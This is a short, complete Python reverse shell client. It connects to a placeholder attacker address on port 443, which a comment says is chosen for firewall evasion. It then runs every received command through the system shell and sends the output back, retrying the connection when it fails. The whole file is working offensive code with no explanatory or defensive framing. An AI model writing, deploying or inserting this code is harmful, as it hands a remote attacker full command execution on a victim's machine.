import os
import socket
import subprocess
import sys

def receiver(s):
    while True:
        cmd_bytes = s.recv(4096) # 4096 is better for heavy transfers!
        cmd = cmd_bytes.decode("utf-8")
        if cmd.startswith("cd "):
            os.chdir(cmd[3:])
            s.send(b"#>: ")
            continue
        if len(cmd) > 0:
            p = subprocess.run(cmd, shell=True, capture_output=True)
            data = p.stdout + p.stderr
            s.sendall(data + b"#>: ")

def connect(address):
    try:
        s = socket.socket()
        s.connect(address)
    except socket.error as error:
        connect(address)
    receiver(s)

if __name__ == "__main__":
    host = "IP_ADDRESS_HERE"
    port = 443 # Better for avoiding firewall
    connect((host, port))